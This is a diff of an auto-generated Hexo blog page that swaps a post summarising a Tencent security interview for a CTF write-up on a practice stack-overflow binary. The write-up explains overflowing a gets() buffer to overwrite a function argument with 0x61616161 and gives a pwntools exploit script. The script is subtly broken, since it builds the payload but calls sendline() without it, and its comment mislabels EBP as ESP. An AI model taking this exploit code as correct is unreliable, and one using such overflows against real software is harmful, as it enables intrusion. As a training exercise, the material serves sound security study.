@@ -6,22 +6,22 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>2025腾讯面试一面总结 | WMBa0</title>
+  <title>【Pwn1】栈溢出+覆盖判断条件练习题 | WMBa0</title>
   <meta name="author" content="WMBa0 &#39;s">
   
-  <meta name="description" content="面试岗位：做安全正向防护sdk的，web和移动端都有
+  <meta name="description" content="题目：
+pwn0
+通过网盘分享的文件：pwn1链接: https://pan.baidu.com/s/1wbcX-sBng65_mNA0vrIKqQ?pwd=1234 提取码: 1234（手机打开转存效果更佳）
+知识点：栈溢出理解
+先来复习一下，栈的结构和参数存储的位置
 
-大概面了40分钟，写代码写了20分钟
-1、自我介绍巴拉巴拉告诉自己擅长什么，打算干啥
-2、介绍自己的项目经历（根据项目经历来问）Android 渗透印象最深刻的漏洞？
-360免费版和360企业版主要的区别？
-Frida检测如何绕过？
-如果你是正向人员，如何隐藏Frida检测？"> 
+静态分析
+把a1替换为0x61616161"> 
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="2025腾讯面试一面总结"/>
+  <meta property="og:title" content="【Pwn1】栈溢出+覆盖判断条件练习题"/>
   <meta property="og:site_name" content="WMBa0"/>
 
   
@@ -121,7 +121,7 @@ Frida检测如何绕过？
 
 	
 		<div class="page-header">
-			<h1> 2025腾讯面试一面总结</h1>
+			<h1> 【Pwn1】栈溢出+覆盖判断条件练习题</h1>
 		</div>
 	
 
@@ -138,31 +138,25 @@ Frida检测如何绕过？
 	<div class="mypage">		
 	  		
 
-	  <p>面试岗位：做安全正向防护sdk的，web和移动端都有</p>
-<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250314111104988.png" alt="Snipaste_2025-03-14_10-46-52"></p>
-<p>大概面了40分钟，写代码写了20分钟</p>
-<h2 id="1、自我介绍"><a href="#1、自我介绍" class="headerlink" title="1、自我介绍"></a>1、自我介绍</h2><p>巴拉巴拉告诉自己擅长什么，打算干啥</p>
-<h2 id="2、介绍自己的项目经历（根据项目经历来问）"><a href="#2、介绍自己的项目经历（根据项目经历来问）" class="headerlink" title="2、介绍自己的项目经历（根据项目经历来问）"></a>2、介绍自己的项目经历（根据项目经历来问）</h2><p>Android 渗透印象最深刻的漏洞？</p>
-<p>360免费版和360企业版主要的区别？</p>
-<p>Frida检测如何绕过？</p>
-<p>如果你是正向人员，如何隐藏Frida检测？</p>
-<p>Android ROM魔改的思路？</p>
-<p>APP脱壳思路？</p>
-<p>SVC 检测绕过的方式？</p>
-<p>小程序调试的思路？</p>
-<p>web防护知道吗？我回答没了解太多（可以委婉一点，说自己学习能力强）</p>
-<p>目前在学校学习那些课程？我说课程全是水课，我自己在学pwn、Android和web</p>
-<h2 id="3、八股文"><a href="#3、八股文" class="headerlink" title="3、八股文"></a>3、八股文</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给定一个整数数组和一个目标值，找到数组中和为目标值的两个数，并返回他们的数组下标</span><br></pre></td></tr></table></figure>
-
-<p>问擅长什么语言，我说c、python、java</p>
-<p>那好用c语言来写</p>
-<p>刚开始不太会，后来在面试官眼皮下面开始调试代码。。。最后也是磨磨唧唧写完了</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.<span class="property">h</span>&gt;</span><br><span class="line">int <span class="title function_">main</span>(<span class="params"></span>) &#123;</span><br><span class="line"></span><br><span class="line">    int nums[<span class="number">4</span>] = &#123; <span class="number">2</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">15</span> &#125;;</span><br><span class="line">    int target = <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (int i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* code */</span></span><br><span class="line">        int tmp = nums[i];</span><br><span class="line">        <span class="keyword">for</span> (int j = i; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (tmp + nums[j] == target) &#123;</span><br><span class="line">                <span class="title function_">printf</span>(<span class="string">&quot;%d&quot;</span>, i + j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="4、结果"><a href="#4、结果" class="headerlink" title="4、结果"></a>4、结果</h2><p>wait等待，如果没有二面总结，估计就凉了。个人感觉Android回答的还行哈哈哈</p>
-<p>算法写的就是一坨，web防护不会估计有降分（检测环境那些）</p>
+	  <p>题目：</p>
+<p><a href="assets/pwn0-20250315135007-mqj492o">pwn0</a></p>
+<p>通过网盘分享的文件：pwn1<br>链接: <a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1wbcX-sBng65_mNA0vrIKqQ?pwd=1234">https://pan.baidu.com/s/1wbcX-sBng65_mNA0vrIKqQ?pwd=1234</a> 提取码: 1234<br>（手机打开转存效果更佳）</p>
+<p>知识点：栈溢出理解</p>
+<p>先来复习一下，栈的结构和参数存储的位置</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142713291.png" alt="image-20250315142713100"></p>
+<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142722955.png" alt="image-20250315142722818"></p>
+<p>把a1替换为0x61616161</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142727498.png" alt="image-20250315142727399"></p>
+<p>gets() 函数不会限制用户输入的数据长度，而变量 s 的大小不是无限的</p>
+<p>s输入的目的是替换 a1的值，将 a1 改写为 0x61616161，让if判断成立。</p>
+<p>我们知道函数参数在栈中是在EIP（返回地址）的上面（地址的上面，高地址）</p>
+<p>现在我们选择使用cyclic去预判（IDA有时候显示的不准确，汇编层面可以看s局部变量存储方式，如果是带有ebp寄存器参与可能显示不准确）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142732202.png" alt="image-20250315142732088"></p>
+<p>cyclic结合gdb的方式</p>
+<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142737462.png" alt="image-20250315142737323"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/WMBa0/hexo_img@main/img/20250315142743303.png" alt="image-20250315142743209"></p>
+<p>‘A’*28 + EBP值替换 + 返回地址(EIP) + 0x61616161</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p= process(<span class="string">&#x27;./pwn0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#局部变量 + ESP + EIP + 替换a1函数参数</span></span><br><span class="line">shell_code=<span class="string">b&#x27;A&#x27;</span>*<span class="number">28</span>+<span class="string">b&#x27;s&#x27;</span>*<span class="number">4</span>+<span class="string">b&#x27;e&#x27;</span>*<span class="number">4</span>+p32(<span class="number">0x61616161</span>)</span><br><span class="line"></span><br><span class="line">p.sendline()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 	  <div class="article-footer-copyright">
 
@@ -180,13 +174,12 @@ Frida检测如何绕过？
 
     
     
-    <a href="/2025/03/15/【Pwn1】栈溢出-覆盖判断条件练习题/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2025/03/12/www-zip文件泄露题目实战/" type="button" class="btn btn-default ">Next<i
+    <a href="/2025/03/14/2025腾讯面试一面总结/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -220,7 +213,7 @@ Frida检测如何绕过？
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2025-03-14 
+	2025-03-15 
 	</div>
 	
 
@@ -233,7 +226,7 @@ Frida检测如何绕过？
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/tags/生活/">生活<span>1</span></a></li>
+  <li><a href="/tags/Pwn/">Pwn<span>1</span></a></li>
     </ul>
 	</div>
 		
